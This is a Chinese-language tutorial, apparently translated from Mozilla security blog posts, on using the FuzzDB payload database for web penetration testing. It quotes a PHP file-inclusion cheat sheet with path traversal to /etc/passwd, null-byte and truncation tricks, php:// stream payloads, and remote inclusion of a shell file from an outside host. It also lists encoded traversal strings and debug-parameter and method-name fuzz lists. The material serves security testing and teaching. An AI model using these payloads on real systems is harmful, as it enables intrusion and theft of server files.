# 使用FuzzDB进行Web安全测试

## FuzzDB介绍

以下引自FuzzDB作者的博客 [Introducing FuzzDB ](https://blog.mozilla.org/security/2013/08/16/introducing-fuzzdb/)

FuzzDB是一个开放源代码数据库，其中包含攻击模式，可预测的资源名称，用于识别有趣的服务器响应的正则表达式模式以及文档资源。它最常用于测试Web应用程序的安全性，但对于许多其他事情也可能有用。FuzzDB从我多年的个人文档和研究笔记开始，并逐渐演变成目前的形式。

大多数开源Web故障注入工具都包含一些测试用例集，这些用例非常不完整和不足。Web协议中使用的符号和编码排列太多，以至于任何人都无法可靠地重复调用它们。至于商业工具，它们的测试用例集到底有多完整？这并不总是那么容易分辨。他们实际在测试什么？这些工具不只是测试用例列表，它们是包裹在复杂规则集中的列表，这些规则确定了何时何地使用哪些测试用例。在考虑了这些细节之后，我对典型的应用程序测试过程的有效性有些怀疑。

我的想法转向提高速度和准确性，从而可以在评估过程中发现某些类别的漏洞。我开始收集，分类和使用攻击字符串以及常用文件和目录名称的列表。最终，我将它们组织到现在的FuzzDB中，并根据开放源代码许可证（知识共享署名）免费提供。
与任何工具一样，有恶意的人可能以不良方式使用FuzzDB。但是，我认为最好为所有人的安全提供此信息。更重要的是，如果开发人员和测试人员可以访问一组良好的测试用例，则将发布已经通过此测试用例列表的软件。
这是我对FuzzDB的最终目标：因为应用程序变得更加安全，它已成为过时的攻击工具。当通过测试和安全编码技术将应用程序和框架与其模式进行接种时，不良参与者将不再发现FuzzDB中的模式有用。

### FuzzDB中有什么

#### 可预测的资源位置
由于存在少量流行的服务器操作系统和基础结构应用程序打包系统，因此诸如日志文件和管理目录之类的资源通常位于少量可预测的位置。FuzzDB包含这些数据库的全面数据库，并按OS平台，Web服务器和应用程序进行分类。测试人员的目的是使用这些列表来进行有根据的猜测，而不是蛮力猜测，从而显着增加成功强制浏览有趣和易受攻击的资源的可能性。同样，它们也适合用于创建自动扫描程序以及IDS / IPS签名。

#### 攻击模式
攻击模式测试用例集按平台，语言和攻击类型分类。这些是已知的恶意和格式错误的输入，会导致信息泄漏和利用。FuzzDB包含全面的攻击有效载荷列表，已知这些载荷会引起诸如OS命令注入，目录列表，目录遍历，源暴露，文件上传旁路，身份验证旁路，http标头crlf注入等问题。
当我说“恶意输入”时，我是说真的。下载项目可能会导致防病毒警报或触发基于模式的恶意代码传感器。尽管FuzzDB本身不过是一组本身无害的文本文件，但文件中包含的某些模式已广泛用于蠕虫，恶意软件和其他漏洞利用。
#### 响应分析
由于系统响应也包含可预测的字符串，因此FuzzDB包含一组正则表达式模式字典，例如用于帮助检测软件安全缺陷的有趣错误消息，常见会话ID cookie名称列表，用于众多个人身份信息的正则表达式等等。
#### 文档
提供了从Web上获取的与有效负载类别相关的有用文档和备忘单。
其他有用的内容– Webshel​​l，通用密码和用户名列表以及一些方便的单词列表。

### FuzzDB可以用来做什么？
使用流行的渗透测试工具（例如OWASP Zap或Burp Suite）进行Web应用程序渗透测试
标准的ZAP拦截代理加载项
构建新的自动化扫描仪和自动化辅助的手动渗透测试工具
测试使用非HTTP语义的网络服务
作为测试GUI或命令行软件的恶意输入
使用这些模式来改善您的开源或商业许可的应用程序
确定对您的探针的有趣响应。这是一个截图，说明在Burp Suite中的外观
通过使用这些测试案例来“攻击”您的Web服务器来测试您的IDS或IPS
网络安全产品供应商的收购过程中的测试
测试新的自定义Web服务器或其他网络服务是否存在过去可能在一个或多个其他平台上使用过的模式的漏洞
建筑入侵识别和响应系统
赢得应用程序安全性夺旗大赛
作为更好地了解可能导致同一漏洞的各种不同恶意字节组合的学习工具

## 使用FuzzDB来测试网站安全
来源：https://blog.mozilla.org/security/2014/03/25/using-fuzzdb-for-testing-website-security/

本文重点介绍了一些艾尔·比林斯最喜欢的FuzzDB文件，并讨论了使用它们的方式。

### 渗透本地文件包含

场景：测试网站时，您会发现本地文件包含（LFI）漏洞。考虑到利用LFI错误的各种方法，FuzzDB可以帮助我们识别一些必需的信息。（此处有一个不错的备忘单：http ://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/   ）
```
Basic Local File Inclusion:

1
<?php include("inc/" . $_GET['file']); ?>
Including files in the same directory:
?file=.htaccess
Path Traversal:
?file=../../../../../../../../../var/lib/locate.db
(this file is very interesting because it lets you search the filesystem, other files)
Including injected PHP code:
?file=../../../../../../../../../var/log/apache/error.log
Tricks:
list of possible Apache dirs
include access log from file descriptor /proc/self/fd/XX
include more info from the proc file system
include email log files
include ssh auth.log
abuse avatar/image/attachment file uploads
include session files
include PHP’s temporarily uploaded files
If you additionally have a phpinfo() output, read here.
Limited Local File Inclusion:

1
<?php include("inc/" . $_GET['file'] . ".htm"); ?>
Null Byte Injection:
?file=../../../../../../../../../etc/passwd%00
(requires magic_quotes_gpc=off)
Directory Listing with Null Byte Injection:
?file=../../../../../../../../../var/www/accounts/%00
(UFS filesystem only, requires magic_quotes_gpc=off, more details here)
Path Truncation:
?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ …
(more details see here and here)
Dot Truncation:
?file=../../../../../../../../../etc/passwd……………. …
(Windows only, more details here)
Reverse Path Truncation:
?file=../../../../ […] ../../../../../etc/passwd
(more details here)
Basic Remote File Inclusion

1
<?php include($_GET['file']); ?>
Including Remote Code:
?file=[http|https|ftp]://websec.wordpress.com/shell.txt
(requires allow_url_fopen=On and allow_url_include=On)
Using PHP stream php://input:
?file=php://input
(specify your payload in the POST parameters, watch urlencoding, details here, requires allow_url_include=On)
Using PHP stream php://filter:
?file=php://filter/convert.base64-encode/resource=index.php
(lets you read PHP source because it wont get evaluated in base64. More details here and here)
Using data URIs:
?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
(requires allow_url_include=On)
Using XSS:
?file=http://127.0.0.1/path/xss.php?xss=phpcode
(makes sense if firewalled or only whitelisted domains allowed)
Limited Remote File Inclusion

1
<?php include($_GET['file'] . ".htm"); ?>
?file=https://websec.wordpress.com/shell
?file=https://websec.wordpress.com/shell.txt?
?file=https://websec.wordpress.com/shell.txt%23
(requires allow_url_fopen=On and allow_url_include=On)

?file=\\evilshare\shell.php
(bypasses allow_url_fopen=Off)

Static Remote File Inclusion:

1
<?php include("http://192.168.1.10/config.php"); ?>
Man In The Middle
(lame indeed, but often forgotten)
Filter evasion

Access files with wildcards (read more here)
Of course you can combine all the tricks. If you are aware of any other or interesting files to include please leave a comment and I’ll add them.
```

首先是目录遍历：遍历多远？如何编码字符以绕过可能的防御性相对路径遍历黑名单，黑名单是许多应用程序使用的常见但安全性较差的机制？

FuzzDB 使用各种奇特的URL编码机制，包含8个目录深度的目录遍历攻击模式集：https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/path-traversal/traversals-8-deep-exotic-encoding.txt

例如：
```
/％c0％ae％c0％ae \ {FILE}

/％c0％ae％c0％ae \％c0％ae％c0％ae \ {FILE}

/％c0％ae％c0％ae \％c0％ae％c0％ae \％c0％ae％c0％ae / {FILE}
```

在您的fuzzer中，将{FILE}替换为与要测试的系统类型相对应的已知文件位置，例如字符串“ etc/password”（对于UNIX系统目标），然后查看返回的输出请求响应以找到指示成功的响应，即已成功检索目标文件。在工作流方面，尝试按返回的字节数对响应进行排序，成功的响应将立即变得显而易见。

traversals-8-deep-exotic-encoding.txt这个cheatsheet 讨论了一种包含注入的PHP代码的方法，但是要做到这一点，您需要能够写入服务器的磁盘。HTTPD守护程序通常具有写许可权的两个位置是访问日志和错误日志。FuzzDB包含从流行的分发程序包中选出的HTTP服务器日志文件的公共位置文件。找到可用的遍历字符串后，将您的模糊器配置为尝试这些文件位置，并附加到先前定位的工作目录路径中（lfi指 Local File Include attacks）：https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/lfi/common-unix-httpd-log-locations.txt

### 未知方法模糊化

当应用程序无法验证当前用户上下文是否有权执行所请求的命令时，就会发生不正确的授权。在使用基于角色的访问控制的应用程序中，一种常见的表示形式是：应用程序使用当前用户的角色来确定要显示的菜单选项，但从不验证所选选项是否在当前用户的允许权限集中。正常使用该应用程序，用户将不太可能选择他们不允许使用的选项，因为它永远不可见。如果攻击者使用这些方法，则它们将能够超出其用户角色的预期权限集。

许多应用程序使用人类可读的值作为参数中传递的应用程序方法。FuzzDB包含常见的Web方法名称列表，可以对其进行模糊处理，以查找可能对用户可用但未由任何菜单显示的功能。

https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/business-logic/CommonMethods.fuzz.txt

CommonMethodNames.txt内容举例：
```
0
1
add
admin
alert
alter
auth
```
这些方法可以注入到其他任何传递的地方，例如GET和POST请求参数值，cookie，序列化请求，REST url以及Web服务。

提示：除了这种有针对性的暴力手段之外，在网站的Javascript文件内部查找也很有用。如果站点设计人员已部署了所有用户下载的整体脚本文件，无论其权限如何，向用户显示的应用程序页面仅调用当前用户角色允许的功能，那么有时您会发现自己尚未使用的端点和方法。爬网时观察到的。

### 剩余调试功能

有时会用剩余的调试代码意外地部署软件。触发后，结果的范围可能是看到扩展的错误消息，这些错误消息揭示了有关应用程序状态或配置的敏感信息，这些信息可用于帮助计划进一步的攻击，绕过身份验证和/或授权，或者显示可能违反安全性的其他测试功能。数据的完整性或机密性，这是开发人员在生产场景中不希望发生的方式。

FuzzDB包含一个调试参数列表，根据我自己的经验，这些调试参数已在错误报告中进行了观察，其中一些参数完全由我假设但很实际：https :
//code.google.com/p/fuzzdb/source/browse/trunk /attack-payloads/BizLogic/DebugParams.fuzz.txt

样本文件内容：
```
"access":1
"access":true
"access":"y"
"access":"yes"
"adm":1
"adm":true
"adm":"y"
"adm":"yes"
"adm1n":1
"adm1n":true
"adm1n":y"
"adm1n":"yes"
```

“ 1”，“ true”，“ y”和“ yes”是我见过的最常见的值。如果您在评估的应用程序中使用了不同但一致的方案，请插入该方案。

在实践中，我很幸运地将它们用作GET请求的名称/值对，POST请求，cookie的名称/值对以及序列化的内部请求，以便从服务器获得有用的响应（对于测试人员）。

### 可预测的文件位置

应用程序安装程序包将组件放置在已知的可预测位置。FuzzDB包含许多流行的Web服务器和应用程序的已知文件位置的列表
https://code.google.com/p/fuzzdb/source/browse/trunk/#trunk%2Fdiscovery%2FPredictableRes

示例：您确定正在测试的服务器正在运行Apache Tomcat。有趣的默认Tomcat文件的常用位置列表用于标识信息泄漏和其他可攻击的功能。discovery/PredictableRes/ApacheTomcat.fuzz.txt

示例：找到一个名为/ admin的目录。部署了文件集，这将有助于识别可能在此目录中的资源。
discovery/PredictableRes/Logins.fuzz.txt

强制浏览可能有趣的文件

某些操作系统和文件编辑器可能会无意间保留敏感文件的备份副本。最终可能会显示源代码，没有任何入站链接的页面，凭据，压缩的备份文件以及谁知道什么。
FuzzDB包含数百个常用文件扩展名，其中包括186个压缩文件格式扩展名，通常用于文件备份版本的扩展名以及Windows Server可以在文件名前添加的一组“ COPY OF”原语。
discovery%2FFilenameBruteforce

实际上，您将在模糊器中将这些列表与在爬网目标应用程序时发现的文件名和路径结合使用。